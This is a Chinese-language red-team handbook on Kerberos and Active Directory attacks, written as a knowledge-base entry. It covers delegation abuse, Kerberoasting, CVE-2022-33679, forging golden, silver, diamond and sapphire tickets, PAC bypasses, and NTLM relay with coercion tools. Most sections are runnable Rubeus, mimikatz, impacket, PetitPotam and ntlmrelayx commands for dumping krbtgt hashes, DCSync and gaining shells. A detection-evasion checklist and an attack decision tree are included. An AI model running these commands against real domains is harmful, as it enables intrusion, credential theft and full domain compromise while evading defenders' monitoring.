---
name: kb-kerberos-protocol-attack
description: Kerberos 协议层攻击纵深手册——委派全链(无约束/约束/RBCD)、Kerberoast与AS-REP进阶(加密降级/CVE-2022-33679)、黄金白银钻石蓝宝石票据伪造、PAC校验与签名强制、Wireshark解密、SMB中继+Coerce全家桶。比域渗透概览深一层的协议级专题，每个攻击含可运行命令与判定门槛，已按 2024-2026 最新研究修订(CVE-2025-53779、CVE-2025-33073、2025 PAC强制)。
tags: [Kerberos, AD, 委派, 票据伪造, PAC, 中继, 协议攻击]
date: 2026-08-14
---

# Kerberos 协议层攻击纵深手册

> 读者画像：已掌握域渗透概览（先读 `kb_intranet_lateral_domain_2026.md`），本手册只讲 Kerberos 协议层机理与可落地命令。前置：一台域内已控机（任意域用户凭据/哈希）。Hashcat 须 GPU；impacket 在攻击机 Linux 跑，Rubeus/mimikatz 在 Windows 目标跑。

## 一、协议地基：三条消息流与票据加密

Kerberos 5 域认证只有三个交互，所有攻击都是对这三步的滥用：

```
Client                 KDC(DC)                    Service
  │── AS-REQ(用户名+预认证)──→│                          │  ① 拿 TGT
  │←── AS-REP(TGT)───────────│                          │     TGT 用 krbtgt 哈希加密
  │── TGS-REQ(TGT+SPN)──────→│                          │  ② 拿服务票据
  │←── TGS-REP(服务票据)──────│                          │     服务票据用服务账号哈希加密
  │── AP-REQ(服务票据)────────────────────────────────→│  ③ 认证到服务
  │←── AP-REP(可选, 互认证)─────────────────────────────│
```
```text
# 加密类型(etype)与破解速度(Hashcat RTX4090 实测量级) —— 决定攻击可行性
0x17 RC4-HMAC(etype 23):   TGS ~2341 MH/s   ← 秒破, NT哈希无盐直接进hashcat
0x12 AES256(etype 18):     TGS ~2.2 MH/s    ← PBKDF2(4096轮), 慢约1000倍
0x11 AES128(etype 17):     TGS ~4.4 MH/s
-128 RC4-MD4(etype -128):  仅预认证禁用账号可用, CVE-2022-33679 用
# 字符串到密钥: RC4=MD4(即NT哈希); AES=PBKDF2-HMAC-SHA1(salt=REALM大写+用户名, 4096迭代)
```
- **TGT 用 krbtgt 哈希加密** → 拿到 krbtgt 哈希 = 伪造任意 TGT（黄金票据）。
- **服务票据用服务账号哈希加密** → 拿到某服务账号哈希 = 伪造该服务 TGS（白银票据）；不知道密码也可用 TGS-REQ 让 KDC 发密文给你离线爆破（Kerberoast）。
- **判定门槛**：票据密钥不经过网络明文传递，离线爆破只针对"KDC 用目标账号密钥加密出的密文块"。

## 二、Kerberos 委派全链（三种类型）

委派解决"双跳"：服务 A 能否以用户身份访问服务 B。三种类型攻击链完全不同。

### 2.1 无约束委派（Unconstrained Delegation）

**机理**：被设无约束委派的主机把用户 TGT 直接缓存在 lsass。拿到该主机权限 → 等/逼高权限账号（最好是 DC）来认证 → 抓 TGT → 复用。

```powershell
# ① 枚举无约束委派主机（域内任意用户）
Get-DomainComputer -Unconstrained | Select-Object dnshostname,useraccountcontrol
# 等价查询: (UserAccountControl -band 0x80000)
# ② 在已控的无约束委派主机上开监听
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
# /filteruser 只抓 DC/高权限目标, 减少噪音
# ③ 触发高权限账号认证（详见 §七 Coerce 全家桶）
SpoolSample.exe DC01.CORP.LAB EVILPC.CORP.LAB
# 或 PetitPotam.exe EVILPC.CORP.LAB DC01.CORP.LAB
# ④ 抓到的 TGT(kirbi) 直接注入
Rubeus.exe ptt /ticket:doIFxxxxxxxx.kirbi
mimikatz # kerberos::ptt doIFxxxxxxxx.kirbi
# ⑤ 用 DC 的 TGT 做 DCSync
mimikatz # lsadump::dcsync /domain:corp.lab /user:krbtgt
```
**协议细节**：无约束委派下 AP-REQ 携带 `forwardable` TGT 作为附加项，lsass 自动缓存。**坑**：Protected Users 组或"敏感，不能委派"账号的 TGT 不转发。**判定门槛**：必须实际抓到高权限 TGT 并 DCSync 成功；仅枚举到无约束委派主机（纯配置）不构成。

### 2.2 约束委派（Constrained Delegation，含协议转换）

**机理**：服务账号属性 `msDS-AllowedToDelegateTo` 列出"允许以任意用户身份访问的 SPN 白名单"。拿到该服务账号哈希 → S4U2Self+S4U2Proxy 一步到位。

**S4U 两条腿（务必理解）**：
- **S4U2Self**：服务用自己的 TGT 向 KDC 要"以任意用户身份访问我自己"的票据。若账号带 `TrustedToAuthForDelegation`(协议转换, UAC 位 0x800000)，此票据**可转发(forwardable)**。
- **S4U2Proxy**：服务把可转发票据作为 additional ticket，向 KDC 要 `msDS-AllowedToDelegateTo` 白名单里目标 SPN 的票据。

```powershell
# ① 枚举约束委派账号 + 白名单
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto
# ② 用服务账号哈希做 S4U，冒充管理员拿目标 SPN 的票
Rubeus.exe s4u /user:svc_app /rc4:2b576acbe6bcfda7294d6bd18041b8fe `
  /impersonateuser:Administrator /msdsspn:HTTP/PRIMARY.CORP.LAB /ptt
#   关键: sname 在票据里不受 PAC 保护 → /altservice 可偷换服务类型
Rubeus.exe s4u /user:svc_app /aes256:<AESKEY> /impersonateuser:Administrator `
  /msdsspn:HTTP/PRIMARY.CORP.LAB /altservice:cifs /ptt
#   cifs=文件共享; ldap=DCSync 用
Rubeus.exe s4u /user:svc_app /rc4:<HASH> /impersonateuser:Administrator `
  /msdsspn:ldap/DC01.CORP.LAB /ptt
mimikatz # lsadump::dcsync /domain:corp.lab /user:krbtgt   # 用 LDAP 票 DCSync
# Linux 侧等价 (impacket)
getST.py -spn cifs/DC01.CORP.LAB -impersonate Administrator corp.lab/svc_app:密码 -dc-ip 10.0.0.1
getST.py -spn ldap/DC01.CORP.LAB -impersonate Administrator -hashes :<NT哈希> corp.lab/svc_app -dc-ip 10.0.0.1
export KRB5CCNAME=Administrator@cifs_DC01.CORP.LAB@CORP.LAB.ccache
psexec.py -k -no-pass corp.lab/Administrator@DC01.CORP.LAB
```
**坑**：
- **无协议转换**：S4U2Self 出不可转发票据，无法直接 S4U2Proxy。破解法：对该服务账号配 **RBCD**（见 2.3），把它作为 delegate-from。
- Protected Users、敏感不可委派账号、或目标为机器账户时无法冒充。
- DCSync 需要 `ldap` SPN 的票（不是 cifs）。

### 2.3 基于资源的约束委派（RBCD）

**机理**：权限反转到**资源侧**。目标计算机属性 `msDS-AllowedToActOnBehalfOfOtherIdentity` 记录"哪些账号可以以任意用户身份访问我"。只要对目标对象有 `GenericWrite/WriteDacl/GenericAll/WriteProperty` 任一权限即可写入——**不需域管**（帮助台/IT 自动化账号常误配）。

```bash
# ① 创建/控制机器账号 (MachineAccountQuota 默认10, 普通域用户可加10台)
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'P@ss123' \
  -dc-ip 10.0.0.1 corp.lab/john:'Password123!'
# ② 把 EVILPC$ 写入目标机的允许委派名单 (RBCD 关键一步)
impacket-rbcd -delegate-from 'EVILPC$' -delegate-to 'TARGET$' \
  -dc-ip 10.0.0.1 -action write corp.lab/john:'Password123!'
# ③ S4U2Self+S4U2Proxy 冒充管理员打目标
impacket-getST -spn cifs/TARGET.CORP.LAB -impersonate Administrator \
  corp.lab/'EVILPC$':'P@ss123' -dc-ip 10.0.0.1
# ④ 使用票据
export KRB5CCNAME=Administrator@cifs_TARGET.CORP.LAB@CORP.LAB.ccache
impacket-psexec -k -no-pass corp.lab/Administrator@TARGET.CORP.LAB
```
```powershell
# Windows 侧等价 (Rubeus)
Rubeus.exe s4u /user:EVILPC$ /rc4:<EVILPC_HASH> /impersonateuser:Administrator `
  /msdsspn:HOST/TARGET.CORP.LAB /ptt
Rubeus.exe s4u /user:EVILPC$ /rc4:<EVILPC_HASH> /impersonateuser:Administrator `
  /msdsspn:ldap/DC01.CORP.LAB /ptt   # 目标若是 DC → DCSync
```
**RBCD 三条件缺一不可**：① 目标可写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 或可创建机器账号且 MAQ>0；② 目标未在 Protected Users；③ 目标服务支持 Kerberos（CIFS/LDAP/HOST/RPCSS）。

**MAQ+NTLM 中继变体（2025 主流）**：LDAP 签名关闭 + MAQ>0，用 PetitPotam 逼 DC 机器账号认证到攻击机，`ntlmrelayx` 转发 LDAPS 一次完成"建机器账号+写 RBCD"：
```bash
sudo impacket-ntlmrelayx -t ldaps://10.0.0.1 --delegate-access -smb2support
# 另一终端: PetitPotam.py 10.0.0.200 10.0.0.1  (攻击机监听, 目标=DC)
# 中继成功自动建机器账号+写RBCD → getST 复用
```
**判定门槛**：RBCD 写入成功 + 拿到目标服务票据 + 实际访问成功（dir c$ / DCSync / psexec）齐备才报。仅"可写属性"是配置面。

## 三、Kerberoast / AS-REP 进阶

### 3.1 Kerberoast 与加密类型选择

**原理**：任何域用户都能向 KDC 请求任意 SPN 的服务票据，KDC 不校验"你是否该访问"。票据用服务账号密钥加密 → 离线爆破。

```bash
# ① 枚举全部 SPN 账号（列表模式, 不请求）
python3 GetUserSPNs.py corp.lab/john:'Password123!' -dc-ip 10.0.0.1
# 输出关注: samaccountname / serviceprincipalname / 组成员
# ② 挑高价值目标后请求票据
python3 GetUserSPNs.py corp.lab/john:'Password123!' -dc-ip 10.0.0.1 \
  -request-user svc_sql -outputfile tgs.txt
#   -request-user 只打单个目标降噪; 也可 -request 全量
# Windows 侧 (Rubeus)
Rubeus.exe kerberoast /outfile:tgs.txt /nowrap
Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt
```
**挑选目标 SPN 的优先级矩阵**：
```text
关键字段: msDS-SupportedEncryptionTypes / PasswordLastSet / adminCount / 高权组成员
Critical = SPN + 密码>1年 + 允许RC4(值0或23) + 高权组成员  → 立即打
High     = 敏感系统权限但非高权组
Low      = 新密码或纯AES(值24+)  → 基本放弃, 破解成本高
```
**Hashcat 爆破模式**：
```bash
hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule   # RC4票(etype23) 首选
hashcat -m 19700 tgs.txt rockyou.txt --rules-file best64.rule   # AES256票(etype18) 慢,字段须准
hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule # AS-REP票 预认证禁用账号
```
**AES 模式 19700 关键坑**（格式字段敏感，错一个零结果）：
- realm 解析时**强制大写**，必须与 KDC realm 一致；用户名**区分大小写**（`administrator`≠`Administrator`）；
- salt = `REALM大写 + 用户名`（无分隔符）进 PBKDF2 4096 轮；
- 13100 相反：user/realm/SPN 只是展示元数据（NT 哈希无盐），**字段错也能破**。

### 3.2 加密降级与 CVE-2022-33679（未认证 Kerberoast）

**原理**（2022-10 披露，2025 仍可利用）：
- 目标：**"不要求 Kerberos 预认证"** 账号（UAC `DONT_REQ_PREAUTH`, 值 4194304）；
- 发**无预认证** AS-REQ，etype 列表只填 `RC4-MD4`(etype -128)。AS-REQ 加密列表无 FAST 保护 → KDC 接受降级；
- RC4-MD4 灾难性弱点：只用 16 字节密钥中 8 字节；密钥不混淆（相同密钥=相同密钥流）；无密码学校验和；生成会话密钥仅 **40 位熵**（其余填 0xAB）；
- 已知明文攻击逐字节爆破 40 位会话密钥（每字节≤256 猜），约 **1280 次请求**恢复会话密钥且不触发锁定 → 直接以该用户身份请求任意 TGS（= 未认证 Kerberoast / 横向）。

```bash
# PoC (github CVE-2022-33679.py, 基于 impacket)
python3 CVE-2022-33679.py -debug -dc-ip 10.0.0.1 corp.lab/administrator DC01
# 参数: 目标域名/预认证禁用账号 + 要请求票的服务名
# 输出: [*] Recovered Session key: 467b61afa0abab...  + 保存 administrator_dc.ccache
export KRB5CCNAME=administrator_dc.ccache
impacket-psexec -k -no-pass -dc-ip 10.0.0.1 corp.lab/Administrator@DC01.CORP.LAB
```
**关系与门槛**：普通 Kerberoast 需一个域账号；CVE-2022-33679 把前置降为**一个预认证禁用的用户名**。AS-REP Roast 只拿离线哈希；CVE-2022-33679 实时恢复会话密钥直接可用。**判定门槛**：恢复会话密钥 + 成功请求 TGS/登录才算；仅确认存在预认证禁用账号 = AS-REP Roast 面。修补状态：Windows 已补丁（RC4-MD4 默认禁用），但大量域未打补丁仍命中。

## 四、票据伪造（黄金/白银/钻石/蓝宝石）

### 4.1 前置：krbtgt/机器哈希 + 域 SID

```bash
# DCSync 拿 krbtgt（需 DC 复制权限: 域管/备份操作员/对应ACL）
impacket-secretsdump -just-dc-user krbtgt corp.lab/admin:'Pass!'@10.0.0.1
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.lab
# 需要: NT哈希 与 AES256 都抄下来 (golden用rc4, diamond用aes256)
# 域 SID
impacket-lookupsid corp.lab/admin:'Pass!'@10.0.0.1 | grep -i 'Domain SID'
nxc ldap 10.0.0.1 -u admin -p 'Pass!' --get-sid
```
### 4.2 黄金票据（Golden Ticket = 伪造 TGT）

**机理**：所有 TGT 用 krbtgt 哈希加密，DC 只验"能解出合法 PAC 即信任"。伪造 TGT 可注入任意 SID（含 Enterprise Admins 519）。

```bash
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid S-1-5-21-xxx -domain corp.lab Administrator
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid S-1-5-21-xxx -domain corp.lab Administrator  # AES更隐蔽
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.lab/Administrator@DC01.CORP.LAB
```
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.lab /sid:S-1-5-21-xxx /rc4:<KRBTGT_NT> /ptt
mimikatz # kerberos::golden /user:Administrator /domain:corp.lab /sid:S-1-5-21-xxx `
  /aes256:<KRBTGT_AES256> /id:500 /groups:512 /endin:600 /renewmax:10080 /ptt
Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator /domain:corp.lab /sid:S-1-5-21-xxx /ptt
```
**关键参数**：`/sid`=域 SID（非机器 SID）；`/id:500`=内建管理员 RID；`/groups:512`=Domain Admins。**OPSEC**：默认 10 年寿命可被检测——用 `/endin:600 /renewmax:10080` 贴合真实 10 小时 TGT。**持久性**：krbtgt 密码**连续改两次**才失效。

### 4.3 白银票据（Silver Ticket = 伪造服务 TGS）

**机理**：用**目标服务/机器账号**哈希伪造该服务专属 TGS。**不经过 KDC** → DC 上无 4768/4769 日志，最隐蔽的横向方式。多数服务（如 SMB）不复查 PAC 组成员。

```bash
impacket-ticketer -nthash <SERVICE_NT> -domain-sid S-1-5-21-xxx -domain corp.lab -spn cifs/DC01.CORP.LAB Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.lab/Administrator@DC01.CORP.LAB
```
```powershell
# mimikatz (银票用 kerberos::golden 模块 + /target /service)
mimikatz # kerberos::golden /domain:corp.lab /user:Administrator /sid:S-1-5-21-xxx `
  /target:DC01.CORP.LAB /service:cifs /rc4:<MACHINE_NT> /ptt
Rubeus.exe silver /service:cifs/DC01.CORP.LAB /aes256:<MACHINE_AES256> `
  /user:Administrator /domain:corp.lab /sid:S-1-5-21-xxx /nowrap
```
```text
# 常用 SPN → 服务映射
cifs/主机 = SMB文件共享;  http/主机 = WinRM/IIS(远程PS);  ldap/DC = DCSync级查询
MSSQLSvc/主机:1433 = SQL;  host/主机 = RPC/Scheduler 等本地服务
```
**坑**：伪造用户名必须真实存在于 AD（2021-11 起 KDC 校验）。

### 4.4 钻石票据（Diamond）与蓝宝石票据（Sapphire）

**共同点**：从**真实 TGT** 出发改造（非离线全伪造），元数据/时间戳/AS 交换真实 → 躲过"缺 4768""寿命异常"检测。

**钻石票据**：普通账号向 KDC 要**真 TGT** → 用 krbtgt AES256 解密 → 改 PAC（注入 512/519/500 组）→ 重算双签名 → 重加密。PAC 组与 AD 可能不一致 → `/ldap /opsec` 对齐 AD 实况降噪。

```powershell
Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:lowpriv /password:P@ssw0rd123 `
  /enctype:aes256 /ticketuser:Administrator /domain:corp.lab `
  /ticketuserid:500 /groups:512,519 /ldap /opsec /nowrap
# 变体: 不知低权账号密码时用 /tgtdeleg 借当前会话 TGT
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /nowrap
# 转 ccache 使用
echo "BASE64" | base64 -d > adm.kirbi
impacket-ticketConverter adm.kirbi adm.ccache
export KRB5CCNAME=adm.ccache
nxc smb corp.lab --use-kcache
```
**蓝宝石票据**：不伪造 PAC，用 **S4U2Self+U2U** 向 KDC 要**目标高权用户真实 PAC** 移植进 TGT 并重签名。PAC 与 AD 完全一致 → 连 PAC 组比对检测都躲过。额外要求：一个**带 SPN 的受控账号**。

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /nowrap
# 严格蓝宝石需显式 S4U2Self 取真实 PAC 再移植; Rubeus 钻石 /tgtdeleg 已是同思路
```
**四票对比与判定门槛**：

| 票据 | 需要 | 交互 | 隐蔽性 | 主要检测 |
|---|---|---|---|---|
| 黄金 | krbtgt 哈希 | 无(离线) | 中 | 缺4768 / 寿命异常 / RC4 |
| 白银 | 服务账号哈希 | 无(离线) | **最高** | 目标机日志( DC 无痕) |
| 钻石 | krbtgt AES256 | 真实AS交换 | 高 | PAC组与AD不符(opsec可缓解) |
| 蓝宝石 | krbtgt AES256+受控SPN账号 | 真实S4U2Self | **最高** | 行为分析 |

**判定门槛**：伪造票必须实际访问目标（DCSync/psexec/winrm 出结果）才算利用成立；仅生成票据是中间产物。

## 五、PAC 校验与签名

### 5.1 PAC 结构

PAC（特权属性证书）是票据内嵌授权数据，含两个关键校验和缓冲区：

```text
PAC (Privilege Attribute Certificate)
├── KERB_VALIDATION_INFO    # 用户SID/主组/组成员GroupIds/ExtraSids 身份信息
├── PAC_SERVER_CHECKSUM(0x06)   # 对整个PAC键控哈希, 用KDC与服务共享密钥
├── PAC_PRIVSVR_CHECKSUM (0x07) # 只对Server Signature键控哈希, 用krbtgt密钥
├── PAC_ATTRIBUTES / PAC_REQUESTOR             # KB5020805后必须携带, 否则被拒
└── PAC_CLIENT_INFO / PAC_UPN_DNS_INFO 等
# 校验算法: RC4可用→HMAC_MD5(16字节); 仅AES256→HMAC_SHA1_96_AES256(12字节)
# 键用途: KERB_NON_KERB_CKSUM_SALT(17)
```
### 5.2 校验流程与绕过现状

- **服务端校验**：把 PAC 两个 Signature 字段清零 → 用共享密钥重算 → 比对 Server Signature；**多数 SMB 服务不验 PAC 成员组**（银票能冒充域管的根因）。
- **KDC 强制（KB5020805, 2022-11 / CVE-2022-37967）**：DC 增加 `KrbtgtFullPacSignature` 注册表（Audit=2 / Enforcement=3）；2024-04（KB5036892）进一步拒绝未签名/空签名/重复签名/RC4 弱算法 PAC。
- **CVE-2025-53779（2025-08 零日, CVSS 9.8）**：KDC `kdsvc.dll` PAC 校验逻辑缺陷，未认证攻击者构造 AS-REQ（操纵 `PA-PAC-REQUEST` + 伪造授权数据）可**免预认证、免任何密钥**让 KDC 发放任意 UPN 的 TGT 且含任意组成员（直接域管）。补丁 KB5044289/KB5044285/KB5044277/KB5044293。**2025-2026 内网未打补丁 DC 是最高优先级目标**。
- **KRB5PAC_Validate**：MIT Kerberos/Heimdal 的 PAC 校验函数（Linux NFS/Kerberos 应用侧），对应 Windows 侧 `KerbValidatePac`。现状：默认 `validate_pac=true`，严格配置下纯伪造 PAC 被拒——但 Windows 域内大量服务仍不校验。

**检测**：4769 的 PAC validation 状态；4768 前无 4769（银票）；AES 强制域出现 RC4 票（金/银/降级信号）。

## 六、TGT/TGS 抓包解密与协议分析

### 6.1 Wireshark 解密 Kerberos

```text
# 前提: 拿到域名 + 相关账号密钥 (krbtgt / 服务账号 / 用户)
Wireshark → Edit → Preferences → Protocols → KRBS → Try to decrypt Kerberos: 勾选
  密钥格式(双击密钥列表添加):  <etype> <domain> <account> <key>
  例:  18 corp.lab krbtgt <AES256_HEX>     23 corp.lab svc_sql <NT_HASH>
# 解密后加密内容(蓝底)可见: PAC、TGT/TGS 明文、会话密钥
```
**抓包要点**：
- AS-REP / TGS-REP 的 `enc-part` 分别用用户会话密钥 / 目标服务密钥加密 → 有对应密钥即解对应票据；
- 无 krbtgt 但有目标服务密钥 → 可解 TGS（验证 Kerberoast 抓到的同一张票）；
- `tcpdump -i eth0 port 88` 或过滤 `kerberos`；跨 DC 分析用 `kerberos.CNameString` 过滤账号。

### 6.2 票据格式解析

```bash
impacket-ticketConverter adm.kirbi adm.ccache
python3 impacket/examples/krb5_parse.py adm.ccache
# 输出: 客户端/服务器/etype/起止时间/是否转发/票据长度
mimikatz # kerberos::list        # 列出当前会话票据与加密类型
Rubeus.exe dump /service:krbtgt  # 导出指定服务票据, 确认 etype/转发位
# kirbi(Windows)=二进制KERB_CRED; ccache(UNIX/impacket)转换后通用
```
**实战用途**：确认 S4U 票据是否 forwardable（无转发位 → 无法 S4U2Proxy 二跳）；确认 etype 是否 23（RC4 → 可秒破）。

## 七、SMB 中继 + 强制认证 Coerce 全家桶

### 7.1 RPC 原理：为什么能"逼"高权限认证

Coerce 利用 Windows RPC 接口缺陷：调用某些 RPC 函数时，目标主动用**机器账号/SYSTEM**身份回连攻击者指定的 UNC（`\\攻击机IP\share`）发起 NTLM 认证。攻击者抓到认证再 relay。

| 技术 | 协议 | 管道/函数 | 触发条件 | 修复状态 |
|---|---|---|---|---|
| PrinterBug/SpoolSample | MS-RPRN | `\pipe\spoolss` `RpcRemoteFindFirstPrinterChangeNotification` | Spooler 服务运行 | 新版仅限 DCERPC |
| PetitPotam | MS-EFSRPC | `\pipe\efsrpc` `EfsRpcOpenFileRaw` | **无需域账号** | 2021-08 补丁, 未打者大量存在 |
| DFSCoerce | MS-DFSNM | `\pipe\netdfs` `NetrDfsRemoveStdRoot` | 需在 DFS 命名空间服务器 | 可打 DC |
| ShadowCoerce | MS-FSRVP | `\pipe\FssagentRpc` `ShadowCopy` 相关 | File Server VSS Agent 服务 | 2025 主流替代 |
| WSPCoerce | MS-WSP | Windows Search 协议 | 工作站 | 较少见 |

```text
# Coercer (自动化枚举/触发所有向量)
coercer coerce -u john -p 'Pass!' -d corp.lab -l 攻击机IP -t DC01.CORP.LAB
coercer coerce -u john -p 'Pass!' -d corp.lab -l 10.0.0.200 -t 10.0.0.1 --target-ip 10.0.0.1 -v
```
### 7.2 中继利用链（LDAPS → RBCD / ADCS）

```bash
# 场景1: 中继到 LDAPS 写 RBCD (要求: LDAP签名关闭 + MAQ>0)
sudo impacket-ntlmrelayx -t ldaps://10.0.0.1 --delegate-access -smb2support
python3 PetitPotam.py 10.0.0.200 10.0.0.1   # 攻击机IP 目标IP(DC)
# 场景2: 中继到 ADCS 证书模板 (ESC8)
sudo impacket-ntlmrelayx -t http://CA01.CORP.LAB/certsrv/certfnsh.asp --adcs --template 'DomainController'
python3 PetitPotam.py 10.0.0.200 10.0.0.1   # 逼 DC 认证 → 拿 DC 证书 → 伪造TGT
# 场景3: 中继到 SMB (需 SMB签名关闭)
sudo impacket-ntlmrelayx -t 10.0.0.50 -smb2support -i    # 拿交互shell
```
### 7.3 2025 新动向

- **CVE-2025-33073**（2025-06 补丁）：SMB 客户端 NTLM 反射，配合 PetitPotam/DFSCoerce 让 `lsass`(SYSTEM) 认证回攻击机后反射中继 → **即使 SMB 签名与信道绑定开启也能跨协议中继到 LDAPS**（剥 NEGOTIATE_ALWAYS_SIGN/SEAL/SIGN 但保留 MIC）。实测企业大范围未打补丁。
- **冷门接口躲避监控**：Unit 42 观测到攻击转向 MS-EVEN `ElfrOpenBELW`、ShadowCoerce、CheeseOunce 等少监控 RPC 函数，从 RADIUS/DC/Citrix 提取机器哈希。
- **判定门槛**：必须"触发认证 → 中继成功 → 目标协议落地（写 RBCD/申请证书/拿 shell）"三连才算；只有回连不构成。

## 八、常见坑与绕过（实战排查清单）

### 8.1 RC4 禁用环境（AES-only 域）

```text
影响:
- 银票必须用 AES256 伪造(机器账号的aesKey), RC4 会被拒;
- Kerberoast 只拿到 $krb5tgs$18$ (AES256), 破解慢1000倍;
- Rubeus s4u 内部 asktgt 报 KDC_ERR_ETYPE_NOTSUPP → 需先喂预铸 TGT;
- 金票尽量用 /aes256, mimikatz 默认 RC4 会失败。
绕过:
- 若某账号仍允许 RC4(msDS-SupportedEncryptionTypes 含23), 该面仍可降级;
- Rubeus /rc4opsec 强制请求 RC4 票; Impacket 尝试降级, RC4 硬禁用则失败。
```
**坑**：纯 AES 域金/银票哈希参数必须用 `-aesKey` / `/aes256`，不要用 `-nthash`/`/rc4`。

### 8.2 约束委派协议转换条件

- **无协议转换**：S4U2Self 不可转发 → 不能直接 S4U2Proxy。破解：对该服务账号做 **RBCD**（delegate-from=该服务账号），或 `/tgtdeleg` 借当前会话 TGT。
- 冒充受限：Protected Users / "敏感且不可委派" 账号 → 拒绝。

### 8.3 Kerberoast 加密类型选择

- 目标 `msDS-SupportedEncryptionTypes = 0 或 23` → 可拿 RC4 票（秒破），优先；`= 24` → AES-only 慢；
- hashcat 19700 字段严格（realm 大写、用户名大小写、salt 拼接），错了零结果不报错——**先 13100 试，不行再切 19700**；
- 单账号用 `-request-user` 降低 4769 洪峰告警。

### 8.4 检测规避（事件 ID 速查）

```text
4768  TGT请求      金票无此事件; 寿命/etype异常是信号
4769  TGS请求      Kerberoast=单源洪峰; 银票无此事件; 关注 TicketEncryptionType
4771  预认证失败    爆破信号
4776  NTLM校验      银票依赖RC4缓存 → 禁NTLM可防
4624  登录成功      目标机侧 PtT 落点, 配合4627组成员
4742  计算机属性变更 RBCD 写 msDS-AllowedToActOnBehalfOfOtherIdentity 在此
5145  命名管道访问  Coerce 各管道(efsrpc/spoolss/netdfs/FssagentRpc)在此
```
```text
# 红队反向规避要点
0x17(RC4) 在 AES 强制域出现 = 强信号 → 红队优先 AES, 保证金票 etype 正常
0x40810010(可转发+可再生+预认证) = S4U2Self 特征;  0x50800000 = S4U2Proxy 结果特征
银票: DC 无痕, 只能靠目标机 4624 + 无前序4768/4769 关联
```
**规避口诀**：金/钻/蓝优先 AES256 且寿命对齐真实策略；Kerberoast 单账号低频打；银票只打目标机日志不审计的环境；Coerce 走冷门管道（ShadowCoerce/EVEN）。

## 九、决策树

```
域内任意账号权限
├─ 有任意SPN? → Kerberoast → 挑RC4高权账号 → hashcat 13100/19700
├─ 有预认证禁用账号? → AS-REP roast(18200) / CVE-2022-33679(未认证直接横移)
├─ 枚举委派属性
│   ├─ 无约束委派主机可控 → monitor + Coerce → 抓DC TGT → DCSync
│   ├─ 约束委派账号哈希 → s4u → 目标SPN票(altservice换cifs/ldap) → DCSync
│   └─ 对目标有GenericWrite → RBCD: addcomputer+rbcd+getST → 目标/DCSync
├─ 有 krbtgt 哈希 → 金票(横向) / 钻石票(持久隐蔽) / 蓝宝石票(最隐蔽)
├─ 有目标服务/机器哈希 → 银票(直接打该服务, 最隐蔽)
└─ 无凭据但可RPC触达 → PetitPotam/ShadowCoerce + ntlmrelayx → LDAPS写RBCD / ADCS ESC8
```
## Sources（2024-2026 验证）

- SpecterOps BloodHound - AllowedToDelegate 边: https://bloodhound.specterops.io/resources/edges/allowed-to-delegate
- CQURE Hacks #64 S4U2Self 细节: https://cqureacademy.com/hacks/64-Attacking-AD-Kerberos-Delegation/
- morimori RBCD Attack Guide (impacket 全链): https://morimori-dev.github.io/en/posts/tech-rbcd-attack-guide/
- Kerberoasting 2025 (目标挑选/加密类型/防御): https://cybersecpentesting.com/blog/kerberoasting-2025.html
- Compass Security Kerberos Deep Dive (etype 破解速度/解密): https://www.compass-security.com/fileadmin/Research/Presentations/2025_03_Kerberos_Deep_Dive_P3_AS-REP_Roasting.pdf
- Hashcat 13100/19700 格式语义: https://strongwind.dev/KerbWolf/guide/hashcat-internals/
- CVE-2022-33679 (Horizon3 未认证 Kerberoast): https://horizon3.ai/attack-research/attack-blogs/from-cve-2022-33679-to-unauthenticated-kerberoasting/
- The Hacker Recipes - Golden/Silver 票据: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
- Diamond/Sapphire 构造对比: https://www.hackingarticles.in/sapphire-ticket-attack-abusing-kerberos-trust/
- ms-pac-forge (PAC 双签名/强制兼容): https://lib.rs/crates/ms-pac-forge
- KB5020805 PAC 签名强制: https://www.ctrlaltnod.com/kb/kb5020805-kerberos-security-update-addresses-pac-signature-bypass/
- MS-KILE 授权数据处理: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/
- CVE-2025-53779 复现 PoC: https://github.com/razureink/cve-2025-53779-kerberos_bypass_reproduction
- CVE-2025-33073 SMB NTLM 反射 (2025): https://healsecurity.com/windows-smb-client-vulnerability-enables-attacker-to-own-active-directory/
- relay_bible (中继防御/检测): https://github.com/rootsecdev/relay_bible
- impel (RPC 强制认证面扫描器): https://github.com/cbev0x/impel
- 蓝队检测 (4768/4769/4776 关联): https://hivesecurity.gitlab.io/blog/pass-the-hash-pass-the-ticket-attack-and-detect/
